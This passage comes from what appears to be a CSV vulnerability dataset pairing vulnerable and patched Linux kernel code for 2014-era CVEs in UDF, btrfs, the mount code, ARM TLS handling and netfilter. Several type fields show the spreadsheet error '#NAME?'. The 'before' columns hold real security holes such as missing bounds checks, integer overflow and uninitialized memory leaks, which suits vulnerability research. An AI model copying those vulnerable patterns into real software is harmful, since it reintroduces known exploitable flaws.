 /* first let's check the buffer parameter's */
 if (params->buffer.fragment_size == 0 ||
  params->buffer.fragments > SIZE_MAX / params->buffer.fragment_size)
 return -EINVAL;

 /* now codec parameters */
","{
 /* first let's check the buffer parameter's */
 if (params->buffer.fragment_size == 0 ||
  params->buffer.fragments > INT_MAX / params->buffer.fragment_size)
 return -EINVAL;

 /* now codec parameters */
"
2016,#NAME?,CVE-2014-9903,"		attr->size = usize;
	}

	ret = copy_to_user(uattr, attr, usize);
 if (ret)
 return -EFAULT;

","		attr->size = usize;
	}

	ret = copy_to_user(uattr, attr, attr->size);
 if (ret)
 return -EFAULT;

"
2016,#NAME?,CVE-2014-9900,,
2016,#NAME?,CVE-2014-9895,"
 for (p = 0; p < entity->num_pads; p++) {
 struct media_pad_desc pad;


 media_device_kpad_to_upad(&entity->pads[p], &pad);
 if (copy_to_user(&links->pads[p], &pad, sizeof(pad)))
 return -EFAULT;
 if (entity->links[l].source->entity != entity)
 continue;


 media_device_kpad_to_upad(entity->links[l].source,
						  &link.source);
 media_device_kpad_to_upad(entity->links[l].sink,
","
 for (p = 0; p < entity->num_pads; p++) {
 struct media_pad_desc pad;

 memset(&pad, 0, sizeof(pad));
 media_device_kpad_to_upad(&entity->pads[p], &pad);
 if (copy_to_user(&links->pads[p], &pad, sizeof(pad)))
 return -EFAULT;
 if (entity->links[l].source->entity != entity)
 continue;

 memset(&link, 0, sizeof(link));
 media_device_kpad_to_upad(entity->links[l].source,
						  &link.source);
 media_device_kpad_to_upad(entity->links[l].sink,
"
2016,#NAME?,CVE-2014-9892,,
2016,#NAME?,CVE-2014-9870," struct cpu_context_save	cpu_context;	/* cpu context */
	__u32			syscall;	/* syscall number */
	__u8			used_cp[16];	/* thread used copro */
 unsigned long		tp_value;
#ifdef CONFIG_CRUNCH
 struct crunch_state	crunchstate;
#endif
#define __ASMARM_TLS_H

#ifdef __ASSEMBLY__
	.macro set_tls_none, tp, tmp1, tmp2

	.endm

	.macro set_tls_v6k, tp, tmp1, tmp2

	mcr	p15, 0, \tp, c13, c0, 3		@ set TLS register
 mov	\tmp1, #0
 mcr	p15, 0, \tmp1, c13, c0, 2	@ clear user r/w TLS register
	.endm

	.macro set_tls_v6, tp, tmp1, tmp2
	ldr	\tmp1, =elf_hwcap
	ldr	\tmp1, [\tmp1, #0]
	mov	\tmp2, #0xffff0fff
	tst	\tmp1, #HWCAP_TLS		@ hardware TLS available?
	mcrne	p15, 0, \tp, c13, c0, 3		@ yes, set TLS register
	movne	\tmp1, #0
	mcrne	p15, 0, \tmp1, c13, c0, 2	@ clear user r/w TLS register
	streq	\tp, [\tmp2, #-15]		@ set TLS value at 0xffff0ff0




	.endm

	.macro set_tls_software, tp, tmp1, tmp2
	mov	\tmp1, #0xffff0fff
	str	\tp, [\tmp1, #-15]		@ set TLS value at 0xffff0ff0
	.endm
#ifdef CONFIG_TLS_REG_EMUL
#define tls_emu 1
#define has_tls_reg 1
#define set_tls		set_tls_none
#elif defined(CONFIG_CPU_V6)
#define tls_emu 0
#define has_tls_reg		(elf_hwcap & HWCAP_TLS)
#define set_tls		set_tls_v6
#elif defined(CONFIG_CPU_32v6K)
#define tls_emu 0
#define has_tls_reg 1
#define set_tls		set_tls_v6k
#else
#define tls_emu 0
#define has_tls_reg 0
#define set_tls		set_tls_software
#endif












#endif /* __ASMARM_TLS_H */
 UNWIND(.fnstart	)
 UNWIND(.cantunwind	)
 add	ip, r1, #TI_CPU_SAVE
	ldr	r3, [r2, #TI_TP_VALUE]
 ARM(	stmia	ip!, {r4 - sl, fp, sp, lr} )	@ Store most regs on stack
 THUMB(	stmia	ip!, {r4 - sl, fp}	   )	@ Store most regs on stack
 THUMB(	str	sp, [ip], #4		   )
 THUMB(	str	lr, [ip], #4		   )


#ifdef CONFIG_CPU_USE_DOMAINS
	ldr	r6, [r2, #TI_CPU_DOMAIN]
#endif
 set_tls	r3, r4, r5
#if defined(CONFIG_CC_STACKPROTECTOR) && !defined(CONFIG_SMP)
	ldr	r7, [r2, #TI_TASK]
	ldr	r8, =__stack_chk_guard
#include <asm/thread_notify.h>
#include <asm/stacktrace.h>
#include <asm/mach/time.h>


#ifdef CONFIG_CC_STACKPROTECTOR
#include <linux/stackprotector.h>
 clear_ptrace_hw_breakpoint(p);

 if (clone_flags & CLONE_SETTLS)
		thread->tp_value = childregs->ARM_r3;


 thread_notify(THREAD_NOTIFY_COPY, thread);

#endif

 case PTRACE_GET_THREAD_AREA:
			ret = put_user(task_thread_info(child)->tp_value,
				       datap);
 break;

 return regs->ARM_r0;

 case NR(set_tls):
		thread->tp_value = regs->ARM_r0;
 if (tls_emu)
 return 0;
 if (has_tls_reg) {
 int reg = (instr >> 12) & 15;
 if (reg == 15)
 return 1;
	regs->uregs[reg] = current_thread_info()->tp_value;
	regs->ARM_pc += 4;
 return 0;
}
"," struct cpu_context_save	cpu_context;	/* cpu context */
	__u32			syscall;	/* syscall number */
	__u8			used_cp[16];	/* thread used copro */
 unsigned long		tp_value[2];	/* TLS registers */
#ifdef CONFIG_CRUNCH
 struct crunch_state	crunchstate;
#endif
#define __ASMARM_TLS_H

#ifdef __ASSEMBLY__
#include <asm/asm-offsets.h>
	.macro switch_tls_none, base, tp, tpuser, tmp1, tmp2
	.endm

	.macro switch_tls_v6k, base, tp, tpuser, tmp1, tmp2
	mrc	p15, 0, \tmp2, c13, c0, 2	@ get the user r/w register
	mcr	p15, 0, \tp, c13, c0, 3		@ set TLS register
 mcr	p15, 0, \tpuser, c13, c0, 2	@ and the user r/w register
 str	\tmp2, [\base, #TI_TP_VALUE + 4] @ save it
	.endm

	.macro switch_tls_v6, base, tp, tpuser, tmp1, tmp2
	ldr	\tmp1, =elf_hwcap
	ldr	\tmp1, [\tmp1, #0]
	mov	\tmp2, #0xffff0fff
	tst	\tmp1, #HWCAP_TLS		@ hardware TLS available?



	streq	\tp, [\tmp2, #-15]		@ set TLS value at 0xffff0ff0
	mrcne	p15, 0, \tmp2, c13, c0, 2	@ get the user r/w register
	mcrne	p15, 0, \tp, c13, c0, 3		@ yes, set TLS register
	mcrne	p15, 0, \tpuser, c13, c0, 2	@ set user r/w register
	strne	\tmp2, [\base, #TI_TP_VALUE + 4] @ save it
	.endm

	.macro switch_tls_software, base, tp, tpuser, tmp1, tmp2
	mov	\tmp1, #0xffff0fff
	str	\tp, [\tmp1, #-15]		@ set TLS value at 0xffff0ff0
	.endm
#ifdef CONFIG_TLS_REG_EMUL
#define tls_emu 1
#define has_tls_reg 1
#define switch_tls	switch_tls_none
#elif defined(CONFIG_CPU_V6)
#define tls_emu 0
#define has_tls_reg		(elf_hwcap & HWCAP_TLS)
#define switch_tls	switch_tls_v6
#elif defined(CONFIG_CPU_32v6K)
#define tls_emu 0
#define has_tls_reg 1
#define switch_tls	switch_tls_v6k
#else
#define tls_emu 0
#define has_tls_reg 0
#define switch_tls	switch_tls_software
#endif

#ifndef __ASSEMBLY__
static inline unsigned long get_tpuser(void)
{
 unsigned long reg = 0;

 if (has_tls_reg && !tls_emu)
 __asm__(""mrc p15, 0, %0, c13, c0, 2"" : ""=r"" (reg));

 return reg;
}
#endif
#endif /* __ASMARM_TLS_H */
 UNWIND(.fnstart	)
 UNWIND(.cantunwind	)
 add	ip, r1, #TI_CPU_SAVE

 ARM(	stmia	ip!, {r4 - sl, fp, sp, lr} )	@ Store most regs on stack
 THUMB(	stmia	ip!, {r4 - sl, fp}	   )	@ Store most regs on stack
 THUMB(	str	sp, [ip], #4		   )
 THUMB(	str	lr, [ip], #4		   )
	ldr	r4, [r2, #TI_TP_VALUE]
	ldr	r5, [r2, #TI_TP_VALUE + 4]
#ifdef CONFIG_CPU_USE_DOMAINS
	ldr	r6, [r2, #TI_CPU_DOMAIN]
#endif
 switch_tls r1, r4, r5, r3, r7
#if defined(CONFIG_CC_STACKPROTECTOR) && !defined(CONFIG_SMP)
	ldr	r7, [r2, #TI_TASK]
	ldr	r8, =__stack_chk_guard
#include <asm/thread_notify.h>
#include <asm/stacktrace.h>
#include <asm/mach/time.h>
#include <asm/tls.h>

#ifdef CONFIG_CC_STACKPROTECTOR
#include <linux/stackprotector.h>
 clear_ptrace_hw_breakpoint(p);

 if (clone_flags & CLONE_SETTLS)
		thread->tp_value[0] = childregs->ARM_r3;
	thread->tp_value[1] = get_tpuser();

 thread_notify(THREAD_NOTIFY_COPY, thread);

#endif

 case PTRACE_GET_THREAD_AREA:
			ret = put_user(task_thread_info(child)->tp_value[0],
				       datap);
 break;

 return regs->ARM_r0;

 case NR(set_tls):
		thread->tp_value[0] = regs->ARM_r0;
 if (tls_emu)
 return 0;
 if (has_tls_reg) {
 int reg = (instr >> 12) & 15;
 if (reg == 15)
 return 1;
	regs->uregs[reg] = current_thread_info()->tp_value[0];
	regs->ARM_pc += 4;
 return 0;
}
"
2016,#NAME?,CVE-2014-9803,"#define PAGE_COPY_EXEC __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN)
#define PAGE_READONLY __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN | PTE_UXN)
#define PAGE_READONLY_EXEC __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN)
#define PAGE_EXECONLY __pgprot(_PAGE_DEFAULT | PTE_NG | PTE_PXN)

#define __P000  PAGE_NONE
#define __P001  PAGE_READONLY
#define __P010  PAGE_COPY
#define __P011  PAGE_COPY
#define __P100 PAGE_EXECONLY
#define __P101  PAGE_READONLY_EXEC
#define __P110  PAGE_COPY_EXEC
#define __P111  PAGE_COPY_EXEC
#define __S001  PAGE_READONLY
#define __S010  PAGE_SHARED
#define __S011  PAGE_SHARED
#define __S100 PAGE_EXECONLY
#define __S101  PAGE_READONLY_EXEC
#define __S110  PAGE_SHARED_EXEC
#define __S111  PAGE_SHARED_EXEC
#define pte_write(pte)		(!!(pte_val(pte) & PTE_WRITE))
#define pte_exec(pte)		(!(pte_val(pte) & PTE_UXN))

#define pte_valid_ng(pte) \
	((pte_val(pte) & (PTE_VALID | PTE_NG)) == (PTE_VALID | PTE_NG))

static inline pte_t pte_wrprotect(pte_t pte)
{
static inline void set_pte_at(struct mm_struct *mm, unsigned long addr,
 pte_t *ptep, pte_t pte)
{
 if (pte_valid_ng(pte)) {
 if (!pte_special(pte) && pte_exec(pte))
 __sync_icache_dcache(pte, addr);
 if (pte_dirty(pte) && pte_write(pte))
good_area:
 /*
	 * Check that the permissions on the VMA allow for the fault which
	 * occurred.

 */
 if (!(vma->vm_flags & vm_flags)) {
		fault = VM_FAULT_BADACCESS;
 struct task_struct *tsk;
 struct mm_struct *mm;
 int fault, sig, code;
 unsigned long vm_flags = VM_READ | VM_WRITE;
 unsigned int mm_flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;

	tsk = current;
","#define PAGE_COPY_EXEC __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN)
#define PAGE_READONLY __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN | PTE_UXN)
#define PAGE_READONLY_EXEC __pgprot(_PAGE_DEFAULT | PTE_USER | PTE_NG | PTE_PXN)


#define __P000  PAGE_NONE
#define __P001  PAGE_READONLY
#define __P010  PAGE_COPY
#define __P011  PAGE_COPY
#define __P100 PAGE_READONLY_EXEC
#define __P101  PAGE_READONLY_EXEC
#define __P110  PAGE_COPY_EXEC
#define __P111  PAGE_COPY_EXEC
#define __S001  PAGE_READONLY
#define __S010  PAGE_SHARED
#define __S011  PAGE_SHARED
#define __S100 PAGE_READONLY_EXEC
#define __S101  PAGE_READONLY_EXEC
#define __S110  PAGE_SHARED_EXEC
#define __S111  PAGE_SHARED_EXEC
#define pte_write(pte)		(!!(pte_val(pte) & PTE_WRITE))
#define pte_exec(pte)		(!(pte_val(pte) & PTE_UXN))

#define pte_valid_user(pte) \
	((pte_val(pte) & (PTE_VALID | PTE_USER)) == (PTE_VALID | PTE_USER))

static inline pte_t pte_wrprotect(pte_t pte)
{
static inline void set_pte_at(struct mm_struct *mm, unsigned long addr,
 pte_t *ptep, pte_t pte)
{
 if (pte_valid_user(pte)) {
 if (!pte_special(pte) && pte_exec(pte))
 __sync_icache_dcache(pte, addr);
 if (pte_dirty(pte) && pte_write(pte))
good_area:
 /*
	 * Check that the permissions on the VMA allow for the fault which
	 * occurred. If we encountered a write or exec fault, we must have
	 * appropriate permissions, otherwise we allow any permission.
 */
 if (!(vma->vm_flags & vm_flags)) {
		fault = VM_FAULT_BADACCESS;
 struct task_struct *tsk;
 struct mm_struct *mm;
 int fault, sig, code;
 unsigned long vm_flags = VM_READ | VM_WRITE | VM_EXEC;
 unsigned int mm_flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;

	tsk = current;
"
2015,#NAME?,CVE-2014-9731," continue;
		}

		flen = udf_get_filename(dir->i_sb, nameptr, fname, lfi);

 if (!flen)
 continue;

 if (!lfi)
 continue;

		flen = udf_get_filename(dir->i_sb, nameptr, fname, lfi);

 if (flen && udf_match(flen, fname, child->len, child->name))
 goto out_ok;
	}
#include <linux/buffer_head.h>
#include ""udf_i.h""

static void udf_pc_to_char(struct super_block *sb, unsigned char *from,
  int fromlen, unsigned char *to)
{
 struct pathComponent *pc;
 int elen = 0;

 unsigned char *p = to;



 while (elen < fromlen) {
		pc = (struct pathComponent *)(from + elen);
 switch (pc->componentType) {
 break;
 /* Fall through */
 case 2:


			p = to;
			*p++ = '/';

 break;
 case 3:


 memcpy(p, ""../"", 3);
			p += 3;

 break;
 case 4:


 memcpy(p, ""./"", 2);
			p += 2;

 /* that would be . - just ignore */
 break;
 case 5:
			p += udf_get_filename(sb, pc->componentIdent, p,
					      pc->lengthComponentIdent);





			*p++ = '/';

 break;
		}
		elen += sizeof(struct pathComponent) + pc->lengthComponentIdent;
		p[-1] = '\0';
 else
		p[0] = '\0';

}

static int udf_symlink_filler(struct file *file, struct page *page)
 symlink = bh->b_data;
	}

 udf_pc_to_char(inode->i_sb, symlink, inode->i_size, p);
 brelse(bh);



 up_read(&iinfo->i_data_sem);
 SetPageUptodate(page);
}

/* unicode.c */
extern int udf_get_filename(struct super_block *, uint8_t *, uint8_t *, int);

extern int udf_put_filename(struct super_block *, const uint8_t *, uint8_t *,
 int);
extern int udf_build_ustr(struct ustr *, dstring *, int);

#include ""udf_sb.h""

static int udf_translate_to_linux(uint8_t *, uint8_t *, int, uint8_t *, int);


static int udf_char_to_ustr(struct ustr *dest, const uint8_t *src, int strlen)
{
 return u_len + 1;
}

int udf_get_filename(struct super_block *sb, uint8_t *sname, uint8_t *dname,
 int flen)
{
 struct ustr *filename, *unifilename;
 int len = 0;
 if (!unifilename)
 goto out1;

 if (udf_build_ustr_exact(unifilename, sname, flen))
 goto out2;

 if (UDF_QUERY_FLAG(sb, UDF_FLAG_UTF8)) {
	} else
 goto out2;

	len = udf_translate_to_linux(dname, filename->u_name, filename->u_len,

				     unifilename->u_name, unifilename->u_len);
out2:
 kfree(unifilename);
#define EXT_MARK '.'
#define CRC_MARK '#'
#define EXT_SIZE 5



static int udf_translate_to_linux(uint8_t *newName, uint8_t *udfName,
 int udfLen, uint8_t *fidName,
 int fidNameLen)
{
 int index, newIndex = 0, needsCRC = 0;
 int extIndex = 0, newExtIndex = 0, hasExt = 0;
					newExtIndex = newIndex;
				}
			}
 if (newIndex < 256)
				newName[newIndex++] = curr;
 else
				needsCRC = 1;
				}
				ext[localExtIndex++] = curr;
			}
			maxFilenameLen = 250 - localExtIndex;
 if (newIndex > maxFilenameLen)
				newIndex = maxFilenameLen;
 else
				newIndex = newExtIndex;
		} else if (newIndex > 250)
			newIndex = 250;
		newName[newIndex++] = CRC_MARK;
		valueCRC = crc_itu_t(0, fidName, fidNameLen);
		newName[newIndex++] = hex_asc_upper_hi(valueCRC >> 8);
"," continue;
		}

		flen = udf_get_filename(dir->i_sb, nameptr, lfi, fname,
					UDF_NAME_LEN);
 if (!flen)
 continue;

 if (!lfi)
 continue;

		flen = udf_get_filename(dir->i_sb, nameptr, lfi, fname,
					UDF_NAME_LEN);
 if (flen && udf_match(flen, fname, child->len, child->name))
 goto out_ok;
	}
#include <linux/buffer_head.h>
#include ""udf_i.h""

static int udf_pc_to_char(struct super_block *sb, unsigned char *from,
 int fromlen, unsigned char *to, int tolen)
{
 struct pathComponent *pc;
 int elen = 0;
 int comp_len;
 unsigned char *p = to;

 /* Reserve one byte for terminating \0 */
	tolen--;
 while (elen < fromlen) {
		pc = (struct pathComponent *)(from + elen);
 switch (pc->componentType) {
 break;
 /* Fall through */
 case 2:
 if (tolen == 0)
 return -ENAMETOOLONG;
			p = to;
			*p++ = '/';
			tolen--;
 break;
 case 3:
 if (tolen < 3)
 return -ENAMETOOLONG;
 memcpy(p, ""../"", 3);
			p += 3;
			tolen -= 3;
 break;
 case 4:
 if (tolen < 2)
 return -ENAMETOOLONG;
 memcpy(p, ""./"", 2);
			p += 2;
			tolen -= 2;
 /* that would be . - just ignore */
 break;
 case 5:
			comp_len = udf_get_filename(sb, pc->componentIdent,
						    pc->lengthComponentIdent,
						    p, tolen);
			p += comp_len;
			tolen -= comp_len;
 if (tolen == 0)
 return -ENAMETOOLONG;
			*p++ = '/';
			tolen--;
 break;
		}
		elen += sizeof(struct pathComponent) + pc->lengthComponentIdent;
		p[-1] = '\0';
 else
		p[0] = '\0';
 return 0;
}

static int udf_symlink_filler(struct file *file, struct page *page)
 symlink = bh->b_data;
	}

 err = udf_pc_to_char(inode->i_sb, symlink, inode->i_size, p, PAGE_SIZE);
 brelse(bh);
 if (err)
 goto out_unlock_inode;

 up_read(&iinfo->i_data_sem);
 SetPageUptodate(page);
}

/* unicode.c */
extern int udf_get_filename(struct super_block *, uint8_t *, int, uint8_t *,
 int);
extern int udf_put_filename(struct super_block *, const uint8_t *, uint8_t *,
 int);
extern int udf_build_ustr(struct ustr *, dstring *, int);

#include ""udf_sb.h""

static int udf_translate_to_linux(uint8_t *, int, uint8_t *, int, uint8_t *,
 int);

static int udf_char_to_ustr(struct ustr *dest, const uint8_t *src, int strlen)
{
 return u_len + 1;
}

int udf_get_filename(struct super_block *sb, uint8_t *sname, int slen,
 uint8_t *dname, int dlen)
{
 struct ustr *filename, *unifilename;
 int len = 0;
 if (!unifilename)
 goto out1;

 if (udf_build_ustr_exact(unifilename, sname, slen))
 goto out2;

 if (UDF_QUERY_FLAG(sb, UDF_FLAG_UTF8)) {
	} else
 goto out2;

	len = udf_translate_to_linux(dname, dlen,
				     filename->u_name, filename->u_len,
				     unifilename->u_name, unifilename->u_len);
out2:
 kfree(unifilename);
#define EXT_MARK '.'
#define CRC_MARK '#'
#define EXT_SIZE 5
/* Number of chars we need to store generated CRC to make filename unique */
#define CRC_LEN 5

static int udf_translate_to_linux(uint8_t *newName, int newLen,
 uint8_t *udfName, int udfLen,
 uint8_t *fidName, int fidNameLen)
{
 int index, newIndex = 0, needsCRC = 0;
 int extIndex = 0, newExtIndex = 0, hasExt = 0;
					newExtIndex = newIndex;
				}
			}
 if (newIndex < newLen)
				newName[newIndex++] = curr;
 else
				needsCRC = 1;
				}
				ext[localExtIndex++] = curr;
			}
			maxFilenameLen = newLen - CRC_LEN - localExtIndex;
 if (newIndex > maxFilenameLen)
				newIndex = maxFilenameLen;
 else
				newIndex = newExtIndex;
		} else if (newIndex > newLen - CRC_LEN)
			newIndex = newLen - CRC_LEN;
		newName[newIndex++] = CRC_MARK;
		valueCRC = crc_itu_t(0, fidName, fidNameLen);
		newName[newIndex++] = hex_asc_upper_hi(valueCRC >> 8);
"
2015,DoS ,CVE-2014-9730,"	tolen--;
 while (elen < fromlen) {
		pc = (struct pathComponent *)(from + elen);

 switch (pc->componentType) {
 case 1:
 /*
			 * Symlink points to some place which should be agreed
 			 * upon between originator and receiver of the media. Ignore.
 */
 if (pc->lengthComponentIdent > 0)

 break;

 /* Fall through */
 case 2:
 if (tolen == 0)
 /* that would be . - just ignore */
 break;
 case 5:



			comp_len = udf_get_filename(sb, pc->componentIdent,
						    pc->lengthComponentIdent,
						    p, tolen);
			tolen--;
 break;
		}
		elen += sizeof(struct pathComponent) + pc->lengthComponentIdent;
	}
 if (p > to + 1)
		p[-1] = '\0';
","	tolen--;
 while (elen < fromlen) {
		pc = (struct pathComponent *)(from + elen);
		elen += sizeof(struct pathComponent);
 switch (pc->componentType) {
 case 1:
 /*
			 * Symlink points to some place which should be agreed
 			 * upon between originator and receiver of the media. Ignore.
 */
 if (pc->lengthComponentIdent > 0) {
				elen += pc->lengthComponentIdent;
 break;
			}
 /* Fall through */
 case 2:
 if (tolen == 0)
 /* that would be . - just ignore */
 break;
 case 5:
			elen += pc->lengthComponentIdent;
 if (elen > fromlen)
 return -EIO;
			comp_len = udf_get_filename(sb, pc->componentIdent,
						    pc->lengthComponentIdent,
						    p, tolen);
			tolen--;
 break;
		}

	}
 if (p > to + 1)
		p[-1] = '\0';
"
2015,DoS ,CVE-2014-9729,"	}
	inode->i_generation = iinfo->i_unique;















 switch (fe->icbTag.fileType) {
 case ICBTAG_FILE_TYPE_DIRECTORY:
		inode->i_op = &udf_dir_inode_operations;
","	}
	inode->i_generation = iinfo->i_unique;

 /* Sanity checks for files in ICB so that we don't get confused later */
 if (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {
 /*
		 * For file in ICB data is stored in allocation descriptor
		 * so sizes should match
 */
 if (iinfo->i_lenAlloc != inode->i_size)
 goto out;
 /* File in ICB has to fit in there... */
 if (inode->i_size > inode->i_sb->s_blocksize -
 udf_file_entry_alloc_offset(inode))
 goto out;
	}

 switch (fe->icbTag.fileType) {
 case ICBTAG_FILE_TYPE_DIRECTORY:
		inode->i_op = &udf_dir_inode_operations;
"
2015,DoS Overflow ,CVE-2014-9728,"	}
	inode->i_generation = iinfo->i_unique;















 switch (fe->icbTag.fileType) {
 case ICBTAG_FILE_TYPE_DIRECTORY:
		inode->i_op = &udf_dir_inode_operations;
","	}
	inode->i_generation = iinfo->i_unique;

 /* Sanity checks for files in ICB so that we don't get confused later */
 if (iinfo->i_alloc_type == ICBTAG_FLAG_AD_IN_ICB) {
 /*
		 * For file in ICB data is stored in allocation descriptor
		 * so sizes should match
 */
 if (iinfo->i_lenAlloc != inode->i_size)
 goto out;
 /* File in ICB has to fit in there... */
 if (inode->i_size > inode->i_sb->s_blocksize -
 udf_file_entry_alloc_offset(inode))
 goto out;
	}

 switch (fe->icbTag.fileType) {
 case ICBTAG_FILE_TYPE_DIRECTORY:
		inode->i_op = &udf_dir_inode_operations;
"
2016,Bypass ,CVE-2014-9717," rcu_read_unlock();

 list_del(&mnt->mnt_instance);







 unlock_mount_hash();

 if (likely(!(mnt->mnt.mnt_flags & MNT_INTERNAL))) {
 propagate_umount(&tmp_list);

 while (!list_empty(&tmp_list)) {

		p = list_first_entry(&tmp_list, struct mount, mnt_list);
 list_del_init(&p->mnt_expire);
 list_del_init(&p->mnt_list);
 if (how & UMOUNT_SYNC)
			p->mnt.mnt_flags |= MNT_SYNC_UMOUNT;

 pin_insert_group(&p->mnt_umount, &p->mnt_parent->mnt, &unmounted);



 if (mnt_has_parent(p)) {
 mnt_add_count(p->mnt_parent, -1);
 umount_mnt(p);





		}
 change_mnt_propagation(p, MS_PRIVATE);
	}
 lock_mount_hash();
 while (!hlist_empty(&mp->m_list)) {
		mnt = hlist_entry(mp->m_list.first, struct mount, mnt_mp_list);
 umount_tree(mnt, 0);







	}
 unlock_mount_hash();
 put_mountpoint(mp);
#define SET_MNT_MARK(m) ((m)->mnt.mnt_flags |= MNT_MARKED)
#define CLEAR_MNT_MARK(m) ((m)->mnt.mnt_flags &= ~MNT_MARKED)
#define IS_MNT_LOCKED(m) ((m)->mnt.mnt_flags & MNT_LOCKED)



#define CL_EXPIRE 0x01
#define CL_SLAVE 0x02
"," rcu_read_unlock();

 list_del(&mnt->mnt_instance);

 if (unlikely(!list_empty(&mnt->mnt_mounts))) {
 struct mount *p, *tmp;
 list_for_each_entry_safe(p, tmp, &mnt->mnt_mounts,  mnt_child) {
 umount_mnt(p);
		}
	}
 unlock_mount_hash();

 if (likely(!(mnt->mnt.mnt_flags & MNT_INTERNAL))) {
 propagate_umount(&tmp_list);

 while (!list_empty(&tmp_list)) {
 bool disconnect;
		p = list_first_entry(&tmp_list, struct mount, mnt_list);
 list_del_init(&p->mnt_expire);
 list_del_init(&p->mnt_list);
 if (how & UMOUNT_SYNC)
			p->mnt.mnt_flags |= MNT_SYNC_UMOUNT;

		disconnect = !IS_MNT_LOCKED_AND_LAZY(p);

 pin_insert_group(&p->mnt_umount, &p->mnt_parent->mnt,
				 disconnect ? &unmounted : NULL);
 if (mnt_has_parent(p)) {
 mnt_add_count(p->mnt_parent, -1);
 if (!disconnect) {
 /* Don't forget about p */
 list_add_tail(&p->mnt_child, &p->mnt_parent->mnt_mounts);
			} else {
 umount_mnt(p);
			}
		}
 change_mnt_propagation(p, MS_PRIVATE);
	}
 lock_mount_hash();
 while (!hlist_empty(&mp->m_list)) {
		mnt = hlist_entry(mp->m_list.first, struct mount, mnt_mp_list);
 if (mnt->mnt.mnt_flags & MNT_UMOUNT) {
 struct mount *p, *tmp;
 list_for_each_entry_safe(p, tmp, &mnt->mnt_mounts,  mnt_child) {
 hlist_add_head(&p->mnt_umount.s_list, &unmounted);
 umount_mnt(p);
			}
		}
 else umount_tree(mnt, 0);
	}
 unlock_mount_hash();
 put_mountpoint(mp);
#define SET_MNT_MARK(m) ((m)->mnt.mnt_flags |= MNT_MARKED)
#define CLEAR_MNT_MARK(m) ((m)->mnt.mnt_flags &= ~MNT_MARKED)
#define IS_MNT_LOCKED(m) ((m)->mnt.mnt_flags & MNT_LOCKED)
#define IS_MNT_LOCKED_AND_LAZY(m) \
	(((m)->mnt.mnt_flags & (MNT_LOCKED|MNT_SYNC_UMOUNT)) == MNT_LOCKED)

#define CL_EXPIRE 0x01
#define CL_SLAVE 0x02
"
2015,DoS ,CVE-2014-9715,"/* Extensions: optional stuff which isn't permanently in struct. */
struct nf_ct_ext {
 struct rcu_head rcu;
 u8 offset[NF_CT_EXT_NUM];
 u8 len;
 char data[0];
};

","/* Extensions: optional stuff which isn't permanently in struct. */
struct nf_ct_ext {
 struct rcu_head rcu;
 u16 offset[NF_CT_EXT_NUM];
 u16 len;
 char data[0];
};

"
2015,#NAME?,CVE-2014-9710," */
 if (!p->leave_spinning)
 btrfs_set_path_blocking(p);
 if (ret < 0)
 btrfs_release_path(p);
 return ret;
}
 unsigned int leave_spinning:1;
 unsigned int search_commit_root:1;
 unsigned int need_commit_sem:1;

};

/*
int verify_dir_item(struct btrfs_root *root,
 struct extent_buffer *leaf,
 struct btrfs_dir_item *dir_item);





/* orphan.c */
int btrfs_insert_orphan_item(struct btrfs_trans_handle *trans,
#include ""hash.h""
#include ""transaction.h""

static struct btrfs_dir_item *btrfs_match_dir_item_name(struct btrfs_root *root,
 struct btrfs_path *path,
 const char *name, int name_len);

/*
 * insert a name into a directory, doing overflow properly if there is a hash
 * collision.  data_size indicates how big the item inserted should be.  On
 * this walks through all the entries in a dir item and finds one
 * for a specific name.
 */
static struct btrfs_dir_item *btrfs_match_dir_item_name(struct btrfs_root *root,
   struct btrfs_path *path,
   const char *name, int name_len)
{
 struct btrfs_dir_item *dir_item;
 unsigned long name_ptr;
#include ""xattr.h""
#include ""disk-io.h""
#include ""props.h""



ssize_t __btrfs_getxattr(struct inode *inode, const char *name,
 struct inode *inode, const char *name,
 const void *value, size_t size, int flags)
{
 struct btrfs_dir_item *di;
 struct btrfs_root *root = BTRFS_I(inode)->root;
 struct btrfs_path *path;
 size_t name_len = strlen(name);
	path = btrfs_alloc_path();
 if (!path)
 return -ENOMEM;



















 if (flags & XATTR_REPLACE) {
		di = btrfs_lookup_xattr(trans, root, path, btrfs_ino(inode), name,
					name_len, -1);
 if (IS_ERR(di)) {
			ret = PTR_ERR(di);
 goto out;
		} else if (!di) {
			ret = -ENODATA;
 goto out;
		}
		ret = btrfs_delete_one_dir_name(trans, root, path, di);
 if (ret)
 goto out;
 btrfs_release_path(path);






 /*
		 * remove the attribute


 */
 if (!value)
 goto out;
	} else {
		di = btrfs_lookup_xattr(NULL, root, path, btrfs_ino(inode),
					name, name_len, 0);
 if (IS_ERR(di)) {
			ret = PTR_ERR(di);
 goto out;
		}
 if (!di && !value)
 goto out;
 btrfs_release_path(path);



	}

again:
	ret = btrfs_insert_xattr_item(trans, root, path, btrfs_ino(inode),
				      name, name_len, value, size);
 /*
	 * If we're setting an xattr to a new value but the new value is say
	 * exactly BTRFS_MAX_XATTR_SIZE, we could end up with EOVERFLOW getting
	 * back from split_leaf.  This is because it thinks we'll be extending
	 * the existing item size, but we're asking for enough space to add the
	 * item itself.  So if we get EOVERFLOW just set ret to EEXIST and let
	 * the rest of the function figure it out.
 */
 if (ret == -EOVERFLOW)
		ret = -EEXIST;



 if (ret == -EEXIST) {
 if (flags & XATTR_CREATE)
 goto out;
 /*
		 * We can't use the path we already have since we won't have the
		 * proper locking for a delete, so release the path and
		 * re-lookup to delete the thing.


 */
 btrfs_release_path(path);
		di = btrfs_lookup_xattr(trans, root, path, btrfs_ino(inode),
					name, name_len, -1);
 if (IS_ERR(di)) {
			ret = PTR_ERR(di);
 goto out;
		} else if (!di) {
 /* Shouldn't happen but just in case... */
 btrfs_release_path(path);
 goto again;





		}

		ret = btrfs_delete_one_dir_name(trans, root, path, di);
 if (ret)
 goto out;





















 /*
		 * We have a value to set, so go back and try to insert it now.


 */
 if (value) {
 btrfs_release_path(path);
 goto again;
		}
	}
out:
 btrfs_free_path(path);
"," */
 if (!p->leave_spinning)
 btrfs_set_path_blocking(p);
